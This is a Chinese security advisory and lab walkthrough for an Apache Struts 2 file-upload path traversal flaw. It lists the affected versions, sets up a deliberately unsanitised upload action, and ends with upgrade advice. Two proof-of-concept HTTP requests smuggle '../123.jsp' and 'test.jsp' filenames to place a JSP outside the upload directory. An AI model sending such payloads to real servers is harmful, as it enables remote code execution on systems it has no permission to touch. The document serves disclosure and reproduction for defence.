<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/a-cjCgsF9uTSNkQx0n8llw)

  

0x00 漏洞描述
---------

*   Apache Struts 2 多个受影响版本中，由于文件上传逻辑存在缺陷，威胁者可操纵文件上传参数导致路径遍历，某些情况下可能上传恶意文件，造成远程代码执行。  
    

0x01 危害等级类型
-----------

*   高危
    
*   逻辑文件上传
    

0x02 影响版本及编号  

---------------

*    Struts 2.5.0-Struts 2.5.32  
    Struts 6.0.0-Struts 6.3.0  
    

0x03 漏洞环境搭建复现  

----------------

```
<dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-core</artifactId>
      <version>6.3.0</version>
</dependency>

```

使用 IDEA 创建 maven 项目勾选 Create from archetype, 然后选中如下图的那条。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/I1c6evzliamI9U8aD7H62YdGC4GHDtRxLvtNXTIxw3yqXombOCkrJA1kicqux0BhUO8jSPd4mGnUjkEoP5b5TD6g/640?wx_fmt=png&from=appmsg)

##### 配置 pom.xml 文件的 struts2 依赖

在 pom.xml 添加依赖

```
    <dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-core</artifactId>
      <version>6.3.0</version>
    </dependency>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/I1c6evzliamI9U8aD7H62YdGC4GHDtRxLPibGptP6n8XlLgBiakcx5roVglty2mcFib6Njdhq4PmGqBn6czuufnuicQ/640?wx_fmt=png&from=appmsg)

定义一个 UploadAction  

```
package com.struts2;
import com.opensymphony.xwork2.ActionSupport;
import org.apache.commons.io.FileUtils;
import org.apache.struts2.ServletActionContext;
import java.io.*;
public class UploadAction extends ActionSupport {
    private static final long serialVersionUID = 1L;
    private File upload;
    // 文件类型，为name属性值 + ContentType
    private String uploadContentType;
    // 文件名称，为name属性值 + FileName
    private String uploadFileName;
    public File getUpload() {
        return upload;
    }
    public void setUpload(File upload) {
        this.upload = upload;
    }
    public String getUploadContentType() {
        return uploadContentType;
    }
    public void setUploadContentType(String uploadContentType) {
        this.uploadContentType = uploadContentType;
    }
    public String getUploadFileName() {
        return uploadFileName;
    }
    public void setUploadFileName(String uploadFileName) {
        this.uploadFileName = uploadFileName;
    }
    public String doUpload() {
        String path = "D:\\up\\";
        String realPath = path + File.separator +uploadFileName;
        try {
            FileUtils.copyFile(upload, new File(realPath));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return SUCCESS;
    }
    }

```

在 struts.xml 当中，通常默认配置下这个文件在项目路径的 / WEB-INF/classes 路径下

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
    <package >
        <action >
            <result >/index.jsp</result>
        </action>
    </package>
</struts>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/I1c6evzliamI9U8aD7H62YdGC4GHDtRxLghXV4FjymKbsTya5woC8RNAkvC9d5l6s6luwicxehqZk3cEfWq0h0aw/640?wx_fmt=png&from=appmsg)

##### web.xml 当中配置好 filter

```
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >
<web-app>
  <display-name>Archetype Created Web Application</display-name>
  <filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>*.action</url-pattern>
  </filter-mapping>
</web-app>

```

##### index.jsp

```
<html>
<body>
<h2>Hello World!</h2>
<form action="upload.action" method="post" enctype="multipart/form-data">
    <input type="file"  />
    <input type="submit" value="Upload" />
</form>
</body>
</html>

```

漏洞复现 poc：

```
POST /untitled4_war_exploded/upload.action HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------299952630938737678921373326300
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Sec-Fetch-Mode: navigate
Origin: http://localhost:8080
Sec-Fetch-Dest: document
Cookie: JSESSIONID=4519C8974359B23EE133A5CEA707D7D0; USER_NAME_COOKIE=admin; SID_1=69cf26c6
Referer: http://localhost:8080/untitled4_war_exploded/
Content-Length: 63765
-----------------------------299952630938737678921373326300
Content-Disposition: form-data; 
Content-Type: image/png
111
-----------------------------299952630938737678921373326300
Content-Disposition: form-data; ; 
Content-Type: text/plain
../123.jsp
-----------------------------299952630938737678921373326300--

```

```
POST /untitled4_war_exploded/upload.action?uploadFileName=test.jsp HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------299952630938737678921373326300
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Sec-Fetch-Mode: navigate
Origin: http://localhost:8080
Sec-Fetch-Dest: document
Cookie: JSESSIONID=4519C8974359B23EE133A5CEA707D7D0; USER_NAME_COOKIE=admin; SID_1=69cf26c6
Referer: http://localhost:8080/untitled4_war_exploded/
Content-Length: 63765
-----------------------------299952630938737678921373326300
Content-Disposition: form-data; 
Content-Type: image/png
111
-----------------------------299952630938737678921373326300--

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/I1c6evzliamI9U8aD7H62YdGC4GHDtRxLHJSfvTbHjkF0DMI86AhlFEMeL7t46hsl6W8APzerqzWGj8OeNv7f0A/640?wx_fmt=png&from=appmsg)

注：https://blog.csdn.net/qq_18193739/article/details/134935865

0x04 修复建议
---------

#####   升级版本目前该漏洞已经修复，受影响用户可升级到 Apache Struts 2.5.33，6.3.0.2 或更高版本

关注及时推送最新安全威胁资讯！
---------------

![](https://mmbiz.qpic.cn/mmbiz_png/I1c6evzliamJEha60KnKYbz1th4SXCe98icgnDgyAeRYps3He2SIIlwqJ9pfAg0eZEu8sBKxreavkasQhGzNrukg/640?wx_fmt=png)**「由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失, 均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本文库不承担责任，均由本人自行承担。本文库中的漏洞均为公开的漏洞收集，若文库中的漏洞出现敏感内容产生了部分影响，请及时联系作者删除漏洞。」**